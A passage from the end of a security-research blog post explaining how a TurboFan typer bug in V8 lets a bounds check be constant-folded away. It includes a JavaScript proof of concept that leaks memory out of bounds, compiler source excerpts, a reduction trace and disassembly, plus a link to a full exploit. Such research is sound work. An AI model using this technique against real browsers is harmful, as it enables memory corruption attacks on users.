  <span class="nx">badly_typed</span> <span class="o">=</span> <span class="nx">badly_typed</span> <span class="o">&gt;&gt;</span> <span class="mi">30</span><span class="p">;</span>

  <span class="kd">let</span> <span class="nx">bad</span> <span class="o">=</span> <span class="nx">badly_typed</span> <span class="o">*</span> <span class="nx">OOB_OFFSET</span><span class="p">;</span>
  <span class="kd">let</span> <span class="nx">leak</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

  <span class="k">if</span> <span class="p">(</span><span class="nx">bad</span> <span class="o">&gt;=</span> <span class="nx">OOB_OFFSET</span> <span class="o">&amp;&amp;</span> <span class="o">++</span><span class="nx">it</span> <span class="o">&lt;</span> <span class="mh">0x10000</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">leak</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">else</span> <span class="p">{</span>
    <span class="kd">let</span> <span class="nx">arr</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Array</span><span class="p">(</span><span class="mf">1.1</span><span class="p">,</span><span class="mf">1.1</span><span class="p">);</span>
    <span class="nx">arr2</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Array</span><span class="p">({},{});</span>
    <span class="nx">leak</span> <span class="o">=</span> <span class="nx">arr</span><span class="p">[</span><span class="nx">bad</span><span class="p">];</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">leak</span> <span class="o">!=</span> <span class="kc">undefined</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">return</span> <span class="nx">leak</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="nx">FAILURE</span><span class="p">;</span>
<span class="p">};</span>

<span class="kd">let</span> <span class="nx">res</span> <span class="o">=</span> <span class="nx">opt_me</span><span class="p">();</span>
<span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mh">0x10000</span><span class="p">;</span> <span class="o">++</span><span class="nx">i</span><span class="p">)</span>
  <span class="nx">res</span> <span class="o">=</span> <span class="nx">opt_me</span><span class="p">();</span>
<span class="o">%</span><span class="nx">DisassembleFunction</span><span class="p">(</span><span class="nx">opt_me</span><span class="p">);</span> <span class="c1">// prints nothing on release builds</span>
<span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mh">0x10000</span><span class="p">;</span> <span class="o">++</span><span class="nx">i</span><span class="p">)</span>
  <span class="nx">res</span> <span class="o">=</span> <span class="nx">opt_me</span><span class="p">();</span>
<span class="nx">print</span><span class="p">(</span><span class="nx">res</span><span class="p">);</span>
<span class="o">%</span><span class="nx">DisassembleFunction</span><span class="p">(</span><span class="nx">opt_me</span><span class="p">);</span> <span class="c1">// prints nothing on release builds</span>
</code></pre></div>


<p>Checkout the result : </p>
<div class="highlight"><pre><span></span><code>$ d8 poc.js
1.5577100569205e-310
</code></pre></div>


<p>It worked despite those aborting bound checks. Why?
The line <code>leak = arr[bad]</code> didnâ€™t lead to any CheckBounds elimination and yet we didn't execute any Unreachable node (aka breakpoint instruction).</p>
<h3 id="native-context-specialization-of-an-element-access">Native context specialization of an element access</h3>
<p>The answer lies in the native context specialization. This is one of the early optimization phase where the compiler is given the opportunity to <a href="https://www.amazon.com/Engineering-Compiler-Keith-Cooper/dp/012088478X">specialize code in a way that capitalizes on its knowledge of the context</a> in which the code will execute.</p>
<p>One of the first optimization phase is the inlining phase, that includes native context specialization. For element accesses, the context specialization is done in <code>JSNativeContextSpecialization::BuildElementAccess</code>.</p>
<p>There is one case that looks very interesting when the load_mode is <code>LOAD_IGNORE_OUT_OF_BOUNDS</code>.</p>
<div class="highlight"><pre><span></span><code>    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">load_mode</span> <span class="o">==</span> <span class="n">LOAD_IGNORE_OUT_OF_BOUNDS</span> <span class="o">&amp;&amp;</span>
               <span class="n">CanTreatHoleAsUndefined</span><span class="p">(</span><span class="n">receiver_maps</span><span class="p">))</span> <span class="p">{</span>
      <span class="c1">// Check that the {index} is a valid array index, we do the actual</span>
      <span class="c1">// bounds check below and just skip the store below if it&#39;s out of</span>
      <span class="c1">// bounds for the {receiver}.</span>
      <span class="n">index</span> <span class="o">=</span> <span class="n">effect</span> <span class="o">=</span> <span class="n">graph</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">NewNode</span><span class="p">(</span>
          <span class="n">simplified</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">CheckBounds</span><span class="p">(</span><span class="n">VectorSlotPair</span><span class="p">()),</span> <span class="n">index</span><span class="p">,</span>
          <span class="n">jsgraph</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">Constant</span><span class="p">(</span><span class="n">Smi</span><span class="o">::</span><span class="n">kMaxValue</span><span class="p">),</span> <span class="n">effect</span><span class="p">,</span> <span class="n">control</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</code></pre></div>


<p>In this case, the CheckBounds node checks the index against a length of <code>Smi::kMaxValue</code>.</p>
<p>The actual bound checking nodes are added as follows: </p>
<div class="highlight"><pre><span></span><code>      <span class="k">if</span> <span class="p">(</span><span class="n">load_mode</span> <span class="o">==</span> <span class="n">LOAD_IGNORE_OUT_OF_BOUNDS</span> <span class="o">&amp;&amp;</span>
          <span class="n">CanTreatHoleAsUndefined</span><span class="p">(</span><span class="n">receiver_maps</span><span class="p">))</span> <span class="p">{</span>
        <span class="n">Node</span><span class="o">*</span> <span class="n">check</span> <span class="o">=</span>
            <span class="n">graph</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">NewNode</span><span class="p">(</span><span class="n">simplified</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">NumberLessThan</span><span class="p">(),</span> <span class="n">index</span><span class="p">,</span> <span class="n">length</span><span class="p">);</span>       <span class="c1">// [1]</span>
        <span class="n">Node</span><span class="o">*</span> <span class="n">branch</span> <span class="o">=</span> <span class="n">graph</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">NewNode</span><span class="p">(</span>
            <span class="n">common</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">Branch</span><span class="p">(</span><span class="n">BranchHint</span><span class="o">::</span><span class="n">kTrue</span><span class="p">,</span>
                             <span class="n">IsSafetyCheck</span><span class="o">::</span><span class="n">kCriticalSafetyCheck</span><span class="p">),</span>
            <span class="n">check</span><span class="p">,</span> <span class="n">control</span><span class="p">);</span>

        <span class="n">Node</span><span class="o">*</span> <span class="n">if_true</span> <span class="o">=</span> <span class="n">graph</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">NewNode</span><span class="p">(</span><span class="n">common</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">IfTrue</span><span class="p">(),</span> <span class="n">branch</span><span class="p">);</span>              <span class="c1">// [2]</span>
        <span class="n">Node</span><span class="o">*</span> <span class="n">etrue</span> <span class="o">=</span> <span class="n">effect</span><span class="p">;</span>
        <span class="n">Node</span><span class="o">*</span> <span class="n">vtrue</span><span class="p">;</span>
        <span class="p">{</span>
          <span class="c1">// Perform the actual load</span>
          <span class="n">vtrue</span> <span class="o">=</span> <span class="n">etrue</span> <span class="o">=</span>
              <span class="n">graph</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">NewNode</span><span class="p">(</span><span class="n">simplified</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">LoadElement</span><span class="p">(</span><span class="n">element_access</span><span class="p">),</span>          <span class="c1">// [3]</span>
                               <span class="n">elements</span><span class="p">,</span> <span class="n">index</span><span class="p">,</span> <span class="n">etrue</span><span class="p">,</span> <span class="n">if_true</span><span class="p">);</span>

        <span class="c1">// [...]</span>
        <span class="p">}</span>

      <span class="c1">// [...]</span>
      <span class="p">}</span>
</code></pre></div>


<p>In a nutshell, with this mode : </p>
<ul>
<li>CheckBounds checks the index against Smi::kMaxValue (0x7FFFFFFF),</li>
<li>A NumberLessThan node is generated,</li>
<li>An IfTrue node is generated,</li>
<li>In the "true" branch, there will be a LoadElement node.</li>
</ul>
<p>The length used by the NumberLessThan node comes from a previously generated LoadField: </p>
<div class="highlight"><pre><span></span><code>    <span class="n">Node</span><span class="o">*</span> <span class="n">length</span> <span class="o">=</span> <span class="n">effect</span> <span class="o">=</span>
        <span class="n">receiver_is_jsarray</span>
            <span class="o">?</span> <span class="n">graph</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">NewNode</span><span class="p">(</span>
                  <span class="n">simplified</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">LoadField</span><span class="p">(</span>
                      <span class="n">AccessBuilder</span><span class="o">::</span><span class="n">ForJSArrayLength</span><span class="p">(</span><span class="n">elements_kind</span><span class="p">)),</span>
                  <span class="n">receiver</span><span class="p">,</span> <span class="n">effect</span><span class="p">,</span> <span class="n">control</span><span class="p">)</span>
            <span class="o">:</span> <span class="n">graph</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">NewNode</span><span class="p">(</span>
                  <span class="n">simplified</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">LoadField</span><span class="p">(</span><span class="n">AccessBuilder</span><span class="o">::</span><span class="n">ForFixedArrayLength</span><span class="p">()),</span>
                  <span class="n">elements</span><span class="p">,</span> <span class="n">effect</span><span class="p">,</span> <span class="n">control</span><span class="p">);</span>
</code></pre></div>


<p>All of this means that TurboFan does generate some bound checking nodes but there won't be any aborting bound check because of the kMaxValue length being used (well technically there is, but the maximum length is unlikely to be reached!).</p>
<h3 id="type-narrowing-and-constant-folding-of-numberlessthan">Type narrowing and constant folding of NumberLessThan</h3>
<p>After the typer phase, the sea of nodes contains a NumberLessThan that compares a badly typed value to the correct array length. This is interesting because the TyperNarrowingReducer is going to change the type [2] with <code>op_typer_.singleton_true()</code> [1].</p>
<div class="highlight"><pre><span></span><code>    <span class="k">case</span> <span class="n">IrOpcode</span><span class="o">::</span><span class="nl">kNumberLessThan</span><span class="p">:</span> <span class="p">{</span>
      <span class="c1">// TODO(turbofan) Reuse the logic from typer.cc (by integrating relational</span>
      <span class="c1">// comparisons with the operation typer).</span>
      <span class="n">Type</span> <span class="n">left_type</span> <span class="o">=</span> <span class="n">NodeProperties</span><span class="o">::</span><span class="n">GetType</span><span class="p">(</span><span class="n">node</span><span class="o">-&gt;</span><span class="n">InputAt</span><span class="p">(</span><span class="mi">0</span><span class="p">));</span>
      <span class="n">Type</span> <span class="n">right_type</span> <span class="o">=</span> <span class="n">NodeProperties</span><span class="o">::</span><span class="n">GetType</span><span class="p">(</span><span class="n">node</span><span class="o">-&gt;</span><span class="n">InputAt</span><span class="p">(</span><span class="mi">1</span><span class="p">));</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">left_type</span><span class="p">.</span><span class="n">Is</span><span class="p">(</span><span class="n">Type</span><span class="o">::</span><span class="n">PlainNumber</span><span class="p">())</span> <span class="o">&amp;&amp;</span>
          <span class="n">right_type</span><span class="p">.</span><span class="n">Is</span><span class="p">(</span><span class="n">Type</span><span class="o">::</span><span class="n">PlainNumber</span><span class="p">()))</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">left_type</span><span class="p">.</span><span class="n">Max</span><span class="p">()</span> <span class="o">&lt;</span> <span class="n">right_type</span><span class="p">.</span><span class="n">Min</span><span class="p">())</span> <span class="p">{</span>
          <span class="n">new_type</span> <span class="o">=</span> <span class="n">op_typer_</span><span class="p">.</span><span class="n">singleton_true</span><span class="p">();</span>              <span class="c1">// [1]</span>
        <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">left_type</span><span class="p">.</span><span class="n">Min</span><span class="p">()</span> <span class="o">&gt;=</span> <span class="n">right_type</span><span class="p">.</span><span class="n">Max</span><span class="p">())</span> <span class="p">{</span>
          <span class="n">new_type</span> <span class="o">=</span> <span class="n">op_typer_</span><span class="p">.</span><span class="n">singleton_false</span><span class="p">();</span>
        <span class="p">}</span>
      <span class="p">}</span>   
      <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>   
  <span class="c1">// [...]</span>
  <span class="n">Type</span> <span class="n">original_type</span> <span class="o">=</span> <span class="n">NodeProperties</span><span class="o">::</span><span class="n">GetType</span><span class="p">(</span><span class="n">node</span><span class="p">);</span>
  <span class="n">Type</span> <span class="k">restricted</span> <span class="o">=</span> <span class="n">Type</span><span class="o">::</span><span class="n">Intersect</span><span class="p">(</span><span class="n">new_type</span><span class="p">,</span> <span class="n">original_type</span><span class="p">,</span> <span class="n">zone</span><span class="p">());</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">original_type</span><span class="p">.</span><span class="n">Is</span><span class="p">(</span><span class="k">restricted</span><span class="p">))</span> <span class="p">{</span>
    <span class="n">NodeProperties</span><span class="o">::</span><span class="n">SetType</span><span class="p">(</span><span class="n">node</span><span class="p">,</span> <span class="k">restricted</span><span class="p">);</span>                 <span class="c1">// [2]</span>
    <span class="k">return</span> <span class="nf">Changed</span><span class="p">(</span><span class="n">node</span><span class="p">);</span>
  <span class="p">}</span> 
</code></pre></div>


<p>Thanks to that, the ConstantFoldingReducer will then simply remove the NumberLessThan node and replace it by a HeapConstant node.</p>
<div class="highlight"><pre><span></span><code><span class="n">Reduction</span> <span class="n">ConstantFoldingReducer</span><span class="o">::</span><span class="n">Reduce</span><span class="p">(</span><span class="n">Node</span><span class="o">*</span> <span class="n">node</span><span class="p">)</span> <span class="p">{</span>
  <span class="n">DisallowHeapAccess</span> <span class="n">no_heap_access</span><span class="p">;</span>
  <span class="c1">// Check if the output type is a singleton.  In that case we already know the</span>
  <span class="c1">// result value and can simply replace the node if it&#39;s eliminable.</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">NodeProperties</span><span class="o">::</span><span class="n">IsConstant</span><span class="p">(</span><span class="n">node</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">NodeProperties</span><span class="o">::</span><span class="n">IsTyped</span><span class="p">(</span><span class="n">node</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
      <span class="n">node</span><span class="o">-&gt;</span><span class="n">op</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">HasProperty</span><span class="p">(</span><span class="n">Operator</span><span class="o">::</span><span class="n">kEliminatable</span><span class="p">))</span> <span class="p">{</span>
    <span class="c1">// TODO(v8:5303): We must not eliminate FinishRegion here. This special</span>
    <span class="c1">// case can be removed once we have separate operators for value and</span>
    <span class="c1">// effect regions.</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">node</span><span class="o">-&gt;</span><span class="n">opcode</span><span class="p">()</span> <span class="o">==</span> <span class="n">IrOpcode</span><span class="o">::</span><span class="n">kFinishRegion</span><span class="p">)</span> <span class="k">return</span> <span class="n">NoChange</span><span class="p">();</span>
    <span class="c1">// We can only constant-fold nodes here, that are known to not cause any</span>
    <span class="c1">// side-effect, may it be a JavaScript observable side-effect or a possible</span>
    <span class="c1">// eager deoptimization exit (i.e. {node} has an operator that doesn&#39;t have</span>
    <span class="c1">// the Operator::kNoDeopt property).</span>
    <span class="n">Type</span> <span class="n">upper</span> <span class="o">=</span> <span class="n">NodeProperties</span><span class="o">::</span><span class="n">GetType</span><span class="p">(</span><span class="n">node</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">upper</span><span class="p">.</span><span class="n">IsNone</span><span class="p">())</span> <span class="p">{</span>
      <span class="n">Node</span><span class="o">*</span> <span class="n">replacement</span> <span class="o">=</span> <span class="k">nullptr</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">upper</span><span class="p">.</span><span class="n">IsHeapConstant</span><span class="p">())</span> <span class="p">{</span>
        <span class="n">replacement</span> <span class="o">=</span> <span class="n">jsgraph</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">Constant</span><span class="p">(</span><span class="n">upper</span><span class="p">.</span><span class="n">AsHeapConstant</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">Ref</span><span class="p">());</span>
      <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">upper</span><span class="p">.</span><span class="n">Is</span><span class="p">(</span><span class="n">Type</span><span class="o">::</span><span class="n">MinusZero</span><span class="p">()))</span> <span class="p">{</span>
        <span class="n">Factory</span><span class="o">*</span> <span class="n">factory</span> <span class="o">=</span> <span class="n">jsgraph</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">isolate</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">factory</span><span class="p">();</span>
        <span class="n">ObjectRef</span> <span class="nf">minus_zero</span><span class="p">(</span><span class="n">broker</span><span class="p">(),</span> <span class="n">factory</span><span class="o">-&gt;</span><span class="n">minus_zero_value</span><span class="p">());</span>
        <span class="n">replacement</span> <span class="o">=</span> <span class="n">jsgraph</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">Constant</span><span class="p">(</span><span class="n">minus_zero</span><span class="p">);</span>
      <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">upper</span><span class="p">.</span><span class="n">Is</span><span class="p">(</span><span class="n">Type</span><span class="o">::</span><span class="n">NaN</span><span class="p">()))</span> <span class="p">{</span>
        <span class="n">replacement</span> <span class="o">=</span> <span class="n">jsgraph</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">NaNConstant</span><span class="p">();</span>
      <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">upper</span><span class="p">.</span><span class="n">Is</span><span class="p">(</span><span class="n">Type</span><span class="o">::</span><span class="n">Null</span><span class="p">()))</span> <span class="p">{</span>
        <span class="n">replacement</span> <span class="o">=</span> <span class="n">jsgraph</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">NullConstant</span><span class="p">();</span>
      <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">upper</span><span class="p">.</span><span class="n">Is</span><span class="p">(</span><span class="n">Type</span><span class="o">::</span><span class="n">PlainNumber</span><span class="p">())</span> <span class="o">&amp;&amp;</span> <span class="n">upper</span><span class="p">.</span><span class="n">Min</span><span class="p">()</span> <span class="o">==</span> <span class="n">upper</span><span class="p">.</span><span class="n">Max</span><span class="p">())</span> <span class="p">{</span>
        <span class="n">replacement</span> <span class="o">=</span> <span class="n">jsgraph</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">Constant</span><span class="p">(</span><span class="n">upper</span><span class="p">.</span><span class="n">Min</span><span class="p">());</span>
      <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">upper</span><span class="p">.</span><span class="n">Is</span><span class="p">(</span><span class="n">Type</span><span class="o">::</span><span class="n">Undefined</span><span class="p">()))</span> <span class="p">{</span>
        <span class="n">replacement</span> <span class="o">=</span> <span class="n">jsgraph</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">UndefinedConstant</span><span class="p">();</span>
      <span class="p">}</span>   
      <span class="k">if</span> <span class="p">(</span><span class="n">replacement</span><span class="p">)</span> <span class="p">{</span>
        <span class="c1">// Make sure the node has a type.</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">NodeProperties</span><span class="o">::</span><span class="n">IsTyped</span><span class="p">(</span><span class="n">replacement</span><span class="p">))</span> <span class="p">{</span>
          <span class="n">NodeProperties</span><span class="o">::</span><span class="n">SetType</span><span class="p">(</span><span class="n">replacement</span><span class="p">,</span> <span class="n">upper</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="n">ReplaceWithValue</span><span class="p">(</span><span class="n">node</span><span class="p">,</span> <span class="n">replacement</span><span class="p">);</span>
        <span class="k">return</span> <span class="nf">Changed</span><span class="p">(</span><span class="n">replacement</span><span class="p">);</span>
      <span class="p">}</span>   
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">NoChange</span><span class="p">();</span>
<span class="p">}</span>
</code></pre></div>


<p>We confirm this behaviour using <code>--trace-turbo-reduction</code>: </p>
<div class="highlight"><pre><span></span><code>- In-place update of 200: NumberLessThan(199, 225) by reducer TypeNarrowingReducer
- Replacement of 200: NumberLessThan(199, 225) with 94: HeapConstant[0x2584e3440659 &lt;true&gt;] by reducer ConstantFoldingReducer
</code></pre></div>


<p>At this point, there isn't any proper bound check left.</p>
<h3 id="observing-the-generated-assembly">Observing the generated assembly</h3>
<p>Let's run again the previous poc. We'll disassemble the function twice. </p>
<p>The first optimized code we can observe contains code related to:</p>
<ul>
<li>a CheckedBounds with a length of MaxValue,</li>
<li>a bound check with a NumberLessThan with the correct length.</li>
</ul>
<div class="highlight"><pre><span></span><code>                =====   FIRST DISASSEMBLY  ===== 

0x11afad03119   119  41c1f91e       sarl r9, 30              // badly_typed &gt;&gt; 30
0x11afad0311d   11d  478d0c89       leal r9,[r9+r9*4]        // badly_typed * OOB_OFFSET

0x11afad03239   239  4c894de0       REX.W movq [rbp-0x20],r9

// CheckBounds (index = badly_typed, length = Smi::kMaxValue)
0x11afad0326f   26f  817de0ffffff7f cmpl [rbp-0x20],0x7fffffff
0x11afad03276   276  0f830c010000   jnc 0x11afad03388  &lt;+0x388&gt; // go to Unreachable

// NumberLessThan (badly_typed, LoadField(array.length) = 2)
0x11afad0327c   27c  837de002       cmpl [rbp-0x20],0x2
0x11afad03280   280  0f8308010000   jnc 0x11afad0338e  &lt;+0x38e&gt;

// LoadElement
0x11afad03286   286  4c8b45e8       REX.W movq r8,[rbp-0x18]  // FixedArray
0x11afad0328a   28a  4c8b4de0       REX.W movq r9,[rbp-0x20]  // badly_typed * OOB_OFFSET
0x11afad0328e   28e  c4817b1044c80f vmovsd xmm0,[r8+r9*8+0xf] // arr[bad]

// Unreachable
0x11afad03388   388  cc             int3l // Unreachable node
</code></pre></div>


<p>The second disassembly is much more interesting. Indeed, only the code corresponding to the CheckBounds remains. The actual bound check was removed!</p>
<div class="highlight"><pre><span></span><code>                     =====  SECOND DISASSEMBLY  ===== 

335 0x2e987c30412f   10f  c1ff1e         sarl rdi, 30 // badly_typed &gt;&gt; 30
336 0x2e987c304132   112  4c8d4120       REX.W leaq r8,[rcx+0x20]
337 0x2e987c304136   116  8d3cbf         leal rdi,[rdi+rdi*4] // badly_typed * OOB_OFFSET

// CheckBounds (index = badly_typed, length = Smi::kMaxValue)
400 0x2e987c304270   250  81ffffffff7f   cmpl rdi,0x7fffffff
401 0x2e987c304276   256  0f83b9000000   jnc 0x2e987c304335  &lt;+0x315&gt;
402 0x2e987c30427c   25c  c5fb1044f90f   vmovsd xmm0,[rcx+rdi*8+0xf] // unchecked access!

441 0x2e987c304335   315  cc             int3l  // Unreachable node
</code></pre></div>


<p>You can confirm it works by launching <a href="https://github.com/JeremyFetiveau/TurboFan-exploit-for-issue-762874">the full exploit</a> on a patched 7.5 d8 shell.</p>
<h1 id="conclusion">Conclusion</h1>
<p>As discussed in this article, the introduction of aborting CheckBounds kind of kills the CheckBound elimination technique for typer bug exploitation. However, we demonstrated a case where TurboFan would defer the bound checking to a NumberLessThan node that would then be incorrectly constant folded because of a bad typing.</p>
<p>Thanks for reading this. Please feel free to shoot me any feedback via my twitter: <a href="https://twitter.com/__x86">@__x86</a>.</p>
<p>Special thanks to my friends <a href="https://twitter.com/0vercl0k">Axel Souchet</a>, <a href="https://twitter.com/yrp604">yrp604</a> and <a href="https://twitter.com/munmap">Georgi Geshev</a> for their review.</p>
<p>Also, if you're interested in TurboFan, don't miss out my future <a href="https://typhooncon.com/speakers/#Jeremy">typhooncon talk</a>!</p>
<p>A bit before publishing this post, <a href="https://twitter.com/5aelo">saelo</a> released a new <a href="http://phrack.org/papers/jit_exploitation.html">phrack article on jit exploitation</a> as well as the slides of his <a href="https://saelo.github.io/presentations/41con_19_jit_exploitation_tricks.pdf">0x41con talk</a>.</p>
<h1 id="references">References</h1>
<ul>
<li>Samuel GroÃŸ's latest <a href="http://phrack.org/papers/jit_exploitation.html">phrack on jit exploitation</a></li>
<li>Samuel GroÃŸ's talk at 0x41con: <a href="https://saelo.github.io/presentations/41con_19_jit_exploitation_tricks.pdf">JIT Exploitation Tricks</a></li>
<li>My previous <a href="https://doar-e.github.io/blog/2019/01/28/introduction-to-turbofan/">introduction to TurboFan</a></li>
<li>Stephen RÃ¶ttger's zer0con talk: <a href="https://docs.google.com/presentation/d/1DJcWByz11jLoQyNhmOvkZSrkgcVhllIlCHmal1tGzaw">A guided tour through Chrome's javascript compiler</a></li>
<li><a href="https://bugs.chromium.org/p/v8/issues/detail?id=8806">Issue 8806: Harden turbofan's bounds check against typer bugs</a></li>
</ul>
                </div><!-- /.entry-content -->
        </article>
</section>
        </div><!--/span-->
      </div><!--/row-->
      <hr>

      <footer style='background-color:#00000000'>
        <center>
          <address id="about">
                  Proudly powered by <a href="http://pelican.notmyidea.org/">Pelican <i class="icon-external-link"></i></a>,
                                  which takes great advantage of <a href="http://python.org">Python <i class="icon-external-link"></i></a>.
          </address><!-- /#about -->

          <p>The theme is from <a href="http://twitter.github.com/bootstrap/">Bootstrap from Twitter <i class="icon-external-link"></i></a>,
                     and <a href="http://fortawesome.github.com/Font-Awesome/">Font-Awesome <i class="icon-external-link"></i></a>, thanks!</p>
        </center>
      </footer>

    </div><!--/.fluid-container-->

<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src='https://www.googletagmanager.com/gtag/js?id=G-N8HQZ0EFSG'></script>
<script>
window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', 'UA-43481215-1');
</script>

    <script src="../../../../../theme/js/jquery-1.7.2.min.js"></script>
    <script src="../../../../../theme/js/bootstrap.min.js"></script>
  </body>
</html>